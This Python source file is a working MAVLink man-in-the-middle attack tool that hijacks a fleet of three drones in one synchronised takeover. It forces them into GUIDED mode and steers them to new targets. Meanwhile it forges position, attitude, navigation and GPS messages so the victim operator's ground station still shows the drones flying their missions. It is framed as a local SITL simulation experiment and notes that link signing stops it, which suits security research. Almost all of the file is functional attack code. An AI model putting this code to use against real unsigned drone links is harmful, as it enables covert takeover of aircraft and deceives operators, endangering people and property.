"""
fleet_attack.py
==============

The MULTI-DRONE version of proxy_multi_attack.py. It sits between a fleet of
simulated drones and two ground stations, and on a single command hijacks the
WHOLE fleet at once while keeping every operator view looking normal.

THE CAST
--------
  * DRONES            : three ArduPilot SITL instances (sysid 1, 2, 3) on
                        TCP 5760, 5770, 5780.
  * QGroundControl    : the TRUTH view (port 14550). Always sees the real fleet,
                        so YOU can watch the drones actually scatter.
  * Mission Planner   : the VICTIM operator (port 14560). During the attack every
                        drone is attacked, so its map shows all three still on
                        their missions.

WHAT IT DOES
------------
  * Fans each drone's telemetry out to BOTH ground stations (truth real,
    victim attacked-during-attack).
  * Routes each ground station's commands to the correct drone by system id,
    so Mission Planner can still set/start a mission on each one.
  * On "go", fires a SYNCHRONISED takeover: GUIDED + a fly-to target sent to all
    three drones in the same instant, and the attack engaged for all three.

Everything is on 127.0.0.1 = pure simulation. As always, this only works because
the links are unsigned/cleartext; signing (config 2) makes every takeover bounce.

RUN ORDER
---------
  1) three terminals, one per drone:
       sim_vehicle.py -v ArduCopter -I0 --sysid 1 --custom-location=40.7828166,16.9320566,350,0 --no-mavproxy
       sim_vehicle.py -v ArduCopter -I1 --sysid 2 --custom-location=40.7833166,16.9320566,350,0 --no-mavproxy
       sim_vehicle.py -v ArduCopter -I2 --sysid 3 --custom-location=40.7828166,16.9325566,350,0 --no-mavproxy
  2) python3 fleet_attack.py
  3) QGroundControl -> auto-connects on 14550 (truth view of the real fleet)
  4) Mission Planner -> UDP link on 14560; give each of the 3 drones a mission, start them
  5) let them fly a bit, then type 'go' in this console to take the whole fleet at once
"""

import math
import os
import threading
import time
from collections import deque

os.environ["MAVLINK20"] = "1"

from pymavlink import mavutil  # noqa: E402

# ===========================================================================
# SETTINGS
# ===========================================================================
# Each drone: (label, where to reach it, expected sysid).
DRONES = [
    ("D1", "tcp:127.0.0.1:5760", 1),
    ("D2", "tcp:127.0.0.1:5770", 2),
    ("D3", "tcp:127.0.0.1:5780", 3),
]

# Ground stations: (label, endpoint, attack_this_view).
GCS_ENDPOINTS = [
    ("QGC-truth", "udpout:127.0.0.1:14550", False),  # sees the REAL fleet
    ("MP-victim", "udpout:127.0.0.1:14560", True),   # attacked during attack
]

# Only start remembering a drone's track once it is actually flying.
MOVE_ALT_THRESH_M = 10.0
MOVE_SPEED_THRESH_MS = 0.5

# Where each hijacked drone is flown: a small offset (deg) from its real position
# at the moment of takeover, so the fleet fans out but stays over the airfield.
ATTACK_LAT_OFFSET_DEG = 0.0015
ATTACK_LON_OFFSET_DEG = 0.0015
ATTACK_ALT_M = 40.0

MODE_GUIDED = 4   # ArduCopter custom mode number for GUIDED
MODE_LAND = 9
MODE_RTL = 6

CSV_COLUMNS = ["time_unix", "direction", "msg_type",
               "src_sys", "src_comp", "lat", "lon", "alt_m", "hdg_deg", "detail"]


# ===========================================================================
# CSV LOGGER (one true + one displayed file per drone)
# ===========================================================================
class TrackLogger:
    def __init__(self, path):
        self.lock = threading.Lock()
        self._fh = open(path, "w", newline="")
        self._fh.write(",".join(CSV_COLUMNS) + "\n")

    def log_pos(self, lat_deg, lon_deg, alt_m, hdg_deg, src_sys, src_comp):
        hdg = "" if hdg_deg is None else f"{hdg_deg:.1f}"
        with self.lock:
            self._fh.write(f"{time.time():.3f},down,GLOBAL_POSITION_INT,"
                           f"{src_sys},{src_comp},{lat_deg:.7f},{lon_deg:.7f},"
                           f"{alt_m:.2f},{hdg},\n")

    def close(self):
        with self.lock:
            self._fh.flush()
            self._fh.close()


# ===========================================================================
# PER-DRONE STATE
# ===========================================================================
class Drone:
    def __init__(self, label, endpoint, sysid):
        self.label = label
        self.endpoint = endpoint
        self.sysid = sysid          # expected; confirmed from the heartbeat
        self.comp = 1
        self.conn = None
        self.lock = threading.Lock()    # guards the state fields below
        self.wlock = threading.Lock()   # serialises WRITES to this drone
        self.attack_active = False
        self.auto_pilot = False     # True only when the PROXY is flying it
        self.moving_started = False
        self.benign_track = deque(maxlen=600)  # (lat, lon, rel_alt, hdg)
        self.replay_idx = 0
        self.attack_hdg = None
        self.attack_pos = None
        self.last_pos = None
        self.target = None          # (lat_int, lon_int, alt_m) when hijacked
        self.guided_seen = False    # for the fleet-synchrony print
        self.true_log = None
        self.disp_log = None


# ===========================================================================
# THE FORGERS (identical technique to the single-drone proxy)
# ===========================================================================
def attacked_position(msg, conn, lat, lon, ralt, hdg):
    real = (msg.lat, msg.lon, msg.relative_alt, msg.hdg, msg.vx, msg.vy)
    saved = (conn.mav.srcSystem, conn.mav.srcComponent)
    msg.lat, msg.lon, msg.relative_alt, msg.hdg = lat, lon, ralt, hdg
    if hdg != 65535:
        speed = math.hypot(msg.vx, msg.vy)
        th = math.radians(hdg / 100.0)
        msg.vx = int(round(speed * math.cos(th)))
        msg.vy = int(round(speed * math.sin(th)))
    conn.mav.srcSystem, conn.mav.srcComponent = msg.get_srcSystem(), msg.get_srcComponent()
    buf = msg.pack(conn.mav)
    conn.mav.srcSystem, conn.mav.srcComponent = saved
    msg.lat, msg.lon, msg.relative_alt, msg.hdg, msg.vx, msg.vy = real
    return buf


def attacked_attitude(msg, conn, hdg_cdeg):
    real_yaw = msg.yaw
    saved = (conn.mav.srcSystem, conn.mav.srcComponent)
    yaw = math.radians(hdg_cdeg / 100.0)
    yaw = (yaw + math.pi) % (2 * math.pi) - math.pi
    msg.yaw = yaw
    conn.mav.srcSystem, conn.mav.srcComponent = msg.get_srcSystem(), msg.get_srcComponent()
    buf = msg.pack(conn.mav)
    conn.mav.srcSystem, conn.mav.srcComponent = saved
    msg.yaw = real_yaw
    return buf


def attacked_nav(msg, conn, hdg_cdeg):
    real = (msg.nav_bearing, msg.target_bearing)
    saved = (conn.mav.srcSystem, conn.mav.srcComponent)
    fake_deg = int(round(hdg_cdeg / 100.0)) % 360
    msg.nav_bearing = fake_deg
    msg.target_bearing = fake_deg
    conn.mav.srcSystem, conn.mav.srcComponent = msg.get_srcSystem(), msg.get_srcComponent()
    buf = msg.pack(conn.mav)
    conn.mav.srcSystem, conn.mav.srcComponent = saved
    msg.nav_bearing, msg.target_bearing = real
    return buf


def attacked_gps(msg, conn, lat, lon, hdg_cdeg):
    real = (msg.lat, msg.lon, msg.cog)
    saved = (conn.mav.srcSystem, conn.mav.srcComponent)
    msg.lat, msg.lon = lat, lon
    if hdg_cdeg != 65535:
        msg.cog = int(round(hdg_cdeg)) % 36000
    conn.mav.srcSystem, conn.mav.srcComponent = msg.get_srcSystem(), msg.get_srcComponent()
    buf = msg.pack(conn.mav)
    conn.mav.srcSystem, conn.mav.srcComponent = saved
    msg.lat, msg.lon, msg.cog = real
    return buf


# ===========================================================================
# FORWARD ONE MESSAGE TO THE VICTIM (attacking the whole cascade if attacking)
# ===========================================================================
# Caller must already hold this GCS connection's lock (because the forgers
# briefly mutate conn.mav, and several drone threads share this one connection).
def forward_to_victim(drone, msg, conn):
    t = msg.get_type()
    with drone.lock:
        active = drone.attack_active
        hdg = drone.attack_hdg
        pos = drone.attack_pos

    if not active:
        conn.write(msg.get_msgbuf())   # honest until the takeover fires
        return

    if t == "GLOBAL_POSITION_INT":
        with drone.lock:
            if drone.benign_track:
                lat, lon, ralt, h = drone.benign_track[drone.replay_idx % len(drone.benign_track)]
                drone.replay_idx += 1
                drone.attack_hdg = h
                drone.attack_pos = (lat, lon, ralt)
            else:
                lat = None
        if lat is not None:
            conn.write(attacked_position(msg, conn, lat, lon, ralt, h))
            d_hdg = h / 100.0 if h != 65535 else None
            drone.disp_log.log_pos(lat / 1e7, lon / 1e7, ralt / 1000.0,
                                   d_hdg, msg.get_srcSystem(), msg.get_srcComponent())
        else:
            conn.write(msg.get_msgbuf())
    elif t == "ATTITUDE" and hdg is not None and hdg != 65535:
        conn.write(attacked_attitude(msg, conn, hdg))
    elif t == "NAV_CONTROLLER_OUTPUT" and hdg is not None and hdg != 65535:
        conn.write(attacked_nav(msg, conn, hdg))
    elif t == "GPS_RAW_INT" and pos is not None and hdg is not None:
        conn.write(attacked_gps(msg, conn, pos[0], pos[1], hdg))
    elif t == "POSITION_TARGET_GLOBAL_INT":
        pass  # drop: it names the real target
    else:
        conn.write(msg.get_msgbuf())


# ===========================================================================
# DOWNLINK: one per drone (drone -> both ground stations)
# ===========================================================================
def downlink(drone, gcs_conns, stop):
    while not stop.is_set():
        msg = drone.conn.recv_match(blocking=True, timeout=0.5)
        if msg is None or msg.get_type() == "BAD_DATA":
            continue
        mtype = msg.get_type()

        # Note when this drone actually enters GUIDED, for the synchrony metric.
        if mtype == "HEARTBEAT" and getattr(msg, "custom_mode", None) == MODE_GUIDED:
            with drone.lock:
                first = not drone.guided_seen
                drone.guided_seen = True
            if first:
                print(f"[{drone.label}] entered GUIDED at t={time.time():.3f}")

        if mtype == "GLOBAL_POSITION_INT":
            rel_alt_m = msg.relative_alt / 1000.0
            speed_ms = math.hypot(msg.vx, msg.vy) / 100.0
            moving_now = rel_alt_m > MOVE_ALT_THRESH_M or speed_ms > MOVE_SPEED_THRESH_MS
            with drone.lock:
                if not drone.moving_started and moving_now:
                    drone.moving_started = True
                if not drone.attack_active and drone.moving_started:
                    drone.benign_track.append((msg.lat, msg.lon, msg.relative_alt, msg.hdg))
                drone.last_pos = (msg.lat, msg.lon, msg.relative_alt)
            hdg_true = msg.hdg / 100.0 if msg.hdg != 65535 else None
            drone.true_log.log_pos(msg.lat / 1e7, msg.lon / 1e7, msg.relative_alt / 1000.0,
                                   hdg_true, msg.get_srcSystem(), msg.get_srcComponent())

        for _label, conn, attack, glock in gcs_conns:
            with glock:                      # one writer at a time per GCS socket
                if attack:
                    forward_to_victim(drone, msg, conn)
                else:
                    conn.write(msg.get_msgbuf())


# ===========================================================================
# UPLINK: one per ground station (GCS -> the right drone, by sysid)
# ===========================================================================
def uplink(label, conn, by_sysid, all_drones, stop):
    while not stop.is_set():
        msg = conn.recv_match(blocking=True, timeout=0.5)
        if msg is None or msg.get_type() == "BAD_DATA":
            continue
        tgt = getattr(msg, "target_system", 0)
        if tgt and tgt in by_sysid:
            d = by_sysid[tgt]
            with d.wlock:
                d.conn.write(msg.get_msgbuf())
        else:
            # No specific target (e.g. the GCS heartbeat) -> send to all drones.
            for d in all_drones:
                with d.wlock:
                    d.conn.write(msg.get_msgbuf())


# ===========================================================================
# THE SYNCHRONISED TAKEOVER
# ===========================================================================
def fire_takeover(all_drones):
    t_fire = time.time()
    fired = 0
    for d in all_drones:
        with d.lock:
            if d.last_pos is None:
                print(f"[{d.label}] no position fix yet - skipped")
                continue
            d.attack_active = True   # start lying to the victim
            d.replay_idx = 0
            d.auto_pilot = False     # hand the controls to QGC, don't auto-fly
        with d.wlock:
            d.conn.mav.command_long_send(
                d.sysid, d.comp, mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, MODE_GUIDED,
                0, 0, 0, 0, 0)
        fired += 1
    print(f"[fleet] SYNCHRONISED takeover: {fired} drones in GUIDED + victim attacked "
          f"at t={t_fire:.3f}. Now steer them from QGC ('Fly to here').")


def scatter_fleet(all_drones):
    """Optional: let the PROXY auto-fly the whole fleet to offset targets."""
    n = 0
    for d in all_drones:
        with d.lock:
            if d.last_pos is None:
                continue
            lat, lon, _ = d.last_pos
            d.target = (lat + int(ATTACK_LAT_OFFSET_DEG * 1e7),
                        lon + int(ATTACK_LON_OFFSET_DEG * 1e7),
                        ATTACK_ALT_M)
            d.attack_active = True
            d.auto_pilot = True
            n += 1
        with d.wlock:
            d.conn.mav.command_long_send(
                d.sysid, d.comp, mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, MODE_GUIDED,
                0, 0, 0, 0, 0)
    print(f"[fleet] auto-diverting {n} drones to offset targets (proxy flying).")


def set_fleet_mode(all_drones, mode):
    for d in all_drones:
        with d.lock:
            d.attack_active = False
        with d.wlock:
            d.conn.mav.command_long_send(
                d.sysid, d.comp, mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mode,
                0, 0, 0, 0, 0)


def streamer(all_drones, stop):
    """Only flies a drone when the PROXY is in control (auto_pilot). When QGC is
    steering, this stays out of the way so it never overrides QGC's commands."""
    type_mask = 0b0000110111111000
    while not stop.is_set():
        for d in all_drones:
            with d.lock:
                auto, tgt = d.auto_pilot, d.target
            if auto and tgt:
                with d.wlock:
                    d.conn.mav.set_position_target_global_int_send(
                        0, d.sysid, d.comp,
                        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
                        type_mask, tgt[0], tgt[1], tgt[2],
                        0, 0, 0, 0, 0, 0, 0, 0)
        time.sleep(0.5)


def console(all_drones, stop):
    print("""
  ====== FLEET RED CONSOLE ======
   go       hijack ALL drones at once -> GUIDED + attack, then steer from QGC
   scatter  proxy auto-flies the whole fleet to offset points (hands-off demo)
   stop     proxy lets go of the stick (drones hold; QGC can steer; attack stays)
   land     force the whole fleet to LAND  (ends the attack)
   rtl      force the whole fleet to RTL   (ends the attack)
   q        quit
  ===============================
""")
    while not stop.is_set():
        try:
            cmd = input("  fleet> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break
        if cmd == "go":
            fire_takeover(all_drones)
        elif cmd == "scatter":
            scatter_fleet(all_drones)
        elif cmd == "stop":
            for d in all_drones:
                with d.lock:
                    d.auto_pilot = False     # stop proxy flying; QGC takes over
            print("  [fleet] proxy released; steer from QGC. Victim still attacked.")
        elif cmd == "land":
            set_fleet_mode(all_drones, MODE_LAND)
            print("  [fleet] whole fleet -> LAND.")
        elif cmd == "rtl":
            set_fleet_mode(all_drones, MODE_RTL)
            print("  [fleet] whole fleet -> RTL.")
        elif cmd in ("q", "quit", "exit"):
            break
    stop.set()


# ===========================================================================
# MAIN
# ===========================================================================
def main():
    drones = [Drone(label, ep, sysid) for label, ep, sysid in DRONES]
    for d in drones:
        print(f"[fleet] connecting to {d.label} at {d.endpoint} ...")
        d.conn = mavutil.mavlink_connection(d.endpoint)
        d.conn.wait_heartbeat()
        d.sysid = d.conn.target_system
        d.comp = d.conn.target_component or 1
        # Fixed names, overwritten each flight, so analyze.py finds them with no
        # timestamps to type. (You said you don't need to keep old runs.)
        d.true_log = TrackLogger(f"true_{d.label}.csv")
        d.disp_log = TrackLogger(f"displayed_{d.label}.csv")
        print(f"[fleet] {d.label} up (sysid {d.sysid})")

    by_sysid = {d.sysid: d for d in drones}
    if len(by_sysid) != len(drones):
        print("[fleet] WARNING: drones share a sysid - set distinct SYSID_THISMAV!")

    gcs_conns = []
    for label, ep, attack in GCS_ENDPOINTS:
        gcs_conns.append((label, mavutil.mavlink_connection(ep), attack, threading.Lock()))
        print(f"[fleet] GCS '{label}' -> {ep} (attack={attack})")

    stop = threading.Event()
    threads = []
    for d in drones:
        threads.append(threading.Thread(target=downlink, args=(d, gcs_conns, stop), daemon=True))
    for label, conn, _attack, _lock in gcs_conns:
        threads.append(threading.Thread(target=uplink, args=(label, conn, by_sysid, drones, stop), daemon=True))
    threads.append(threading.Thread(target=streamer, args=(drones, stop), daemon=True))
    threads.append(threading.Thread(target=console, args=(drones, stop), daemon=True))

    for t in threads:
        t.start()
    print(f"[fleet] running with {len(drones)} drones. Type 'go' to strike. Ctrl+C to quit.")

    try:
        while not stop.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        for d in drones:
            d.true_log.close()
            d.disp_log.close()
        print("[fleet] logs written; bye.")


if __name__ == "__main__":
    main()